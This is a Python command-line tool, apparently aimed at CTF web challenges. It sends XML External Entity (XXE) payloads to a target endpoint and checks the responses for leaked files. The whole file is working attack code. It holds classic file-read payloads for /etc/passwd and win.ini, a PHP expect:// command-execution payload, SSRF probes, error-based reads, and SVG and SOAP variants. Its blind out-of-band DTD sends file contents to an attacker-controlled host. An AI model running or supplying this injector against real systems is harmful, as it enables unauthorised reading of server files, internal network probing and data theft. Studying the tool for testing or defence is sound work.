#!/usr/bin/env python3
"""
XXE (XML External Entity) injector.
Sends crafted XML payloads to test for XXE vulnerabilities:
  - Classic file read via external entity
  - Blind XXE via out-of-band DNS/HTTP callback
  - Error-based XXE
  - Parameter entity XXE
  - XXE in SVG, XLSX, and SOAP bodies
Requires: requests
"""

import argparse
import sys

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests not installed: pip install requests", file=sys.stderr)
    sys.exit(1)


# ── Payload templates ─────────────────────────────────────────────────────────

def payload_classic(target_file: str) -> str:
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<root><data>&xxe;</data></root>"""


def payload_php_expect(command: str) -> str:
    return f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://{command}">
]>
<root>&xxe;</root>"""


def payload_ssrf(internal_url: str) -> str:
    return f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{internal_url}">
]>
<root>&xxe;</root>"""


def payload_oob(oob_host: str, target_file: str) -> str:
    """Blind OOB XXE — triggers DNS lookup + HTTP request to attacker host."""
    return f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://{oob_host}/evil.dtd">
  %remote;
]>
<root/>"""


def payload_oob_dtd(oob_host: str, target_file: str) -> str:
    """The evil.dtd content that should be hosted on the OOB server."""
    return (
        f'<!ENTITY % file SYSTEM "file://{target_file}">\n'
        f'<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM '
        f"'http://{oob_host}/?data=%file;'>\">\n"
        f"%wrap;\n%send;"
    )


def payload_error_based(target_file: str) -> str:
    """Error-based XXE — file content appears in error message."""
    return f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{target_file}">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>"""


def payload_svg(target_file: str) -> str:
    return f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""


def payload_soap(target_file: str) -> str:
    return f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <data>&xxe;</data>
  </soapenv:Body>
</soapenv:Envelope>"""


# ── Detection helpers ─────────────────────────────────────────────────────────

FILE_CANARIES = {
    "/etc/passwd":        ["root:x:", "root:!:", "/bin/bash"],
    "/etc/hostname":      ["localhost", ".local", ".internal"],
    "/proc/version":      ["Linux version"],
    "/windows/win.ini":   ["[fonts]", "[extensions]"],
    "C:\\windows\\win.ini": ["[fonts]", "[extensions]"],
}

ERROR_STRINGS = [
    "java.io.FileNotFoundException",
    "System.Xml.XmlException",
    "XML parse error",
    "XMLSyntaxError",
    "entity",
    "DOCTYPE",
    "SYSTEM",
]


def check_response(body: str, target_file: str) -> list[str]:
    canaries = FILE_CANARIES.get(target_file, ["root:x:", "127.0.0.1", "flag{"])
    return [c for c in canaries if c.lower() in body.lower()]


def check_error(body: str) -> list[str]:
    return [e for e in ERROR_STRINGS if e.lower() in body.lower()]


# ── Request sender ────────────────────────────────────────────────────────────

def send(session, url, xml_body, content_type, timeout):
    try:
        r = session.post(url, data=xml_body.encode(),
                         headers={"Content-Type": content_type},
                         timeout=timeout, verify=False, allow_redirects=True)
        return r
    except Exception:
        return None


def make_session(headers: list[str]) -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (CTF-XXE)"
    for h in headers:
        k, _, v = h.partition(":")
        s.headers[k.strip()] = v.strip()
    return s


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="XXE injector for CTF web challenges")
    parser.add_argument("--url",      required=True, help="Target URL (POST endpoint)")
    parser.add_argument("--file",     default="/etc/passwd",
                        help="File to read via XXE (default: /etc/passwd)")
    parser.add_argument("--oob",      metavar="HOST",
                        help="Out-of-band host for blind XXE detection")
    parser.add_argument("--ssrf",     metavar="INTERNAL_URL",
                        help="Internal URL for SSRF-via-XXE probe")
    parser.add_argument("--mode",     choices=["classic", "error", "svg", "soap",
                                               "oob", "ssrf", "all"],
                        default="all")
    parser.add_argument("--content-type", default="application/xml",
                        dest="ctype",
                        help="Content-Type header (default: application/xml)")
    parser.add_argument("--timeout",  type=int, default=10)
    parser.add_argument("--headers",  action="append", default=[], metavar="H:V")
    args = parser.parse_args()

    session = make_session(args.headers)
    target  = args.file

    print(f"[*] Target: {args.url}")
    print(f"[*] File:   {target}")

    results = []

    def run(label, xml):
        r = send(session, args.url, xml, args.ctype, args.timeout)
        if r is None:
            print(f"  [-] {label}: request failed")
            return
        hits   = check_response(r.text, target)
        errors = check_error(r.text)
        size   = len(r.content)
        if hits:
            print(f"  [+] {label}: FILE READ CONFIRMED  canaries={hits}")
            snippet = r.text[:400].replace('\n', '\\n')
            print(f"      Status: {r.status_code}  Size: {size}B")
            print(f"      Snippet: {snippet}\n")
            results.append({"label": label, "hits": hits})
        elif errors:
            print(f"  [~] {label}: XML/entity error in response — possible XXE  errors={errors}")
        else:
            print(f"  [-] {label}: status={r.status_code}  size={size}B  no hits")

    if args.mode in ("classic", "all"):
        run("classic file read", payload_classic(target))

    if args.mode in ("error", "all"):
        run("error-based XXE", payload_error_based(target))

    if args.mode in ("svg", "all"):
        run("SVG XXE", payload_svg(target))

    if args.mode in ("soap", "all"):
        run("SOAP XXE", payload_soap(target))

    if args.mode in ("ssrf", "all") and args.ssrf:
        run(f"SSRF via XXE -> {args.ssrf}", payload_ssrf(args.ssrf))

    if args.mode in ("oob", "all") and args.oob:
        print(f"\n[*] Blind OOB XXE — host your DTD file with this content:")
        print(payload_oob_dtd(args.oob, target))
        print(f"\n[*] Sending OOB trigger payload ...")
        run(f"OOB XXE (check {args.oob} for callbacks)", payload_oob(args.oob, target))

    if results:
        print(f"\n[+] {len(results)} successful XXE finding(s):")
        for r in results:
            print(f"    {r['label']}  canaries={r['hits']}")
    else:
        print("\n[-] No confirmed XXE (check OOB callbacks if using blind mode)")


if __name__ == "__main__":
    main()
